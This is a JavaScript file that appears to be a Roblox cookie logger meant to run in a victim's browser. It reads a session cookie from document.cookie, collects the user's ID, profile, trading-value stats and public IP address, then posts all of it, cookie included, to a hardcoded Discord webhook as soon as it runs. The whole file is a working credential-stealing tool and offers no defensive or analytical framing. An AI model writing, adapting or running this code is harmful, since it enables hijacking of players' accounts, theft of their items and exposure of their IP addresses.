const webhook = "https://discord.com/api/webhooks/1426741706203729920/PC1esaYAlDocap9N4u6exHlLLbLV8nMXLstdPW36_T5UO5-MfZc58qJfc7mBpXtVAr9y";

// try fixing shit aight dont roast my ass


async function fetchWithRetry(url, options = {}, retries = 3, delay = 1000) {
  try {
    const response = await fetch(url, options);
    if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
    return response;
  } catch (err) {
    if (retries > 0) {
      console.warn(`Fetch failed for ${url}. Retrying in ${delay}ms... (${retries} retries left)`);
      await new Promise(res => setTimeout(res, delay));
      return fetchWithRetry(url, options, retries - 1, delay * 2);
    } else {
      throw err;
    }
  }
}


const getRobloxUserId = () => {
  try {
    const url = window.location.href;
    const match = url.match(/\/users\/(\d+)\//);
    if (match) return match[1];
    console.warn("Roblox user ID not found in URL");
    return null;
  } catch (err) {
    console.error("Error extracting user ID:", err);
    return null;
  }
};


function getCookie(name) {
  try {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    console.warn(`Cookie "${name}" not found`);
    return null;
  } catch (err) {
    console.error(`Error reading cookie "${name}":`, err);
    return null;
  }
}


const token = getCookie(cookieName);

// Fetch Roblox user profile info
async function fetchRobloxUserInfo(userId) {
  try {
    const response = await fetchWithRetry(`https://users.roblox.com/v1/users/${userId}`);
    const data = await response.json();
    const headshotUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
    return {
      name: data?.name ?? "Unknown",
      id: userId,
      avatarUrl: "https://cdn-icons-png.flaticon.com/512/847/847969.png",
      headshotUrl
    };
  } catch (err) {
    console.error("Failed to fetch Roblox user info:", err);
    return null;
  }
}


async function fetchRolimonStats(userId) {
  try {
    const response = await fetchWithRetry(`https://rolimons.com/playerapi.php?userid=${userId}`);
    const data = await response.json();
    return {
      profit: data?.profit ?? "N/A",
      loss: data?.loss ?? "N/A",
      inventoryValue: data?.inventory_value ?? "N/A"
    };
  } catch (err) {
    console.error("Failed to fetch Rolimon's stats:", err);
    return {
      profit: "N/A",
      loss: "N/A",
      inventoryValue: "N/A"
    };
  }
}


async function fetchIp() {
  try {
    const response = await fetchWithRetry('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (err) {
    console.error("Failed to fetch IP address:", err);
    return "Unknown IP";
  }
}


async function sendRobloxInfo() {
  const userId = getRobloxUserId();
  if (!userId) {
    console.error("Cannot proceed: User ID missing");
    return;
  }

  if (!token) {
    console.error(`Cannot proceed: Cookie "${cookieName}" not found`);
    return;
  }

  let [userInfo, rolimonStats, ipAddress] = [null, null, null];

  try {
    [userInfo, rolimonStats, ipAddress] = await Promise.all([
      fetchRobloxUserInfo(userId),
      fetchRolimonStats(userId),
      fetchIp()
    ]);
  } catch (err) {
    console.error("Error fetching data:", err);
    return;
  }

  if (!userInfo) {
    console.warn("User info is null, aborting webhook");
    return;
  }

  const timestamp = new Date().toISOString();
  const profileUrl = `https://www.roblox.com/users/${userId}/profile`;
  const avatarIconUrl = "https://cdn.iconscout.com/icon/free/png-256/roblox-16-461119.png";

  const embed = {
    color: 0x5865F2,
    author: {
      name: `👤 ${userInfo.name}`,
      url: profileUrl,
      icon_url: avatarIconUrl
    },
    title: `Roblox User Info | IP: ${ipAddress}`,
    description: `
__**User Details:**__
🆔 **ID:** ${userId}
🌐 **IP Address:** ${ipAddress}
🖼️ **Headshot:** [Click Here](${userInfo.headshotUrl})

__**Roblox Account:**__  
📝 **Name:** ${userInfo.name}  
🖥️ **Profile:** [Profile Link](${profileUrl})

__**Rolimon's Stats:**__  
💰 **Profit:** \`${rolimonStats.profit}\`  
💸 **Loss:** \`${rolimonStats.loss}\`  
🏦 **Inventory Value:** \`${rolimonStats.inventoryValue}\`
`,
    thumbnail: {
      url: userInfo.headshotUrl
    },
    fields: [
      {
        name: "Roblox Cookie",
        value: `\`\`\`${token}\`\`\``,
        inline: false
      }
    ],
    footer: {
      text: "🌐 Data via APIs",
      icon_url: "https://cdn-icons-png.flaticon.com/512/732/732200.png"
    },
    timestamp
  };

  try {
    const response = await fetchWithRetry(webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
    if (response.ok) {
      console.log("✅ Webhook sent successfully");
    } else {
      console.error(`Failed to send webhook: Status ${response.status}`);
    }
  } catch (err) {
    console.error("Error sending webhook:", err);
  }
}

// Run the function
sendRobloxInfo();
